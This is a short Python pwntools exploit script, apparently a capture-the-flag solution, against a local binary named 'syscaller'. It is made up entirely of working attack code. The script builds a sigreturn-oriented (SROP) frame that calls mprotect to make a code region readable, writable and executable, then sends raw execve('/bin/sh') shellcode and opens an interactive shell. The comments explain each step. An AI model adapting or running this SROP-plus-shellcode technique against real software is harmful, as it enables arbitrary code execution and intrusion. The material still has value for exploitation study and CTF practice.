#!/usr/bin/python 
from pwn import *

s = process("./syscaller")
context.arch = "amd64"
frame = SigreturnFrame()

r12 = "0"*8
r11 = r12
rdi = r12
rax = p64(0xf)                      # syscall number for sigreturn 
rbx = r12 
rdx = r12 
rsi = r12 
rdi = r12 

payload = ""
payload += r12 
payload += r11 
payload += rdi 
payload += rax 
payload += rbx 
payload += rdx 
payload += rsi 
payload += rdi 

frame.rip = 0x00400104              # before the read call so that we can use read again
frame.rax = 0xa                     # syscall number for mprotect(start, size, permissions)
frame.rdi = 0x400000                # start region
frame.rsi = 0x1000                  # size 
frame.rdx = 7                       # read,write,execute

frame.rsp = 0x0040011a              # make rsp point to the pop instructions. This is because we want to overwrite those instructions with our shellcode, and in ghidra we see that when setting up for read(), there's an instruction mov rsi, rsp => we read data into rsp => make rsp the pop instructions to overwrite them

payload += str(frame)

shellcode = "\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05"          # https://teamrocketist.github.io/2017/09/18/Pwn-CSAW-Pilot/

s.sendline(payload)
s.sendline(shellcode)               # for the 2nd read()
s.interactive()
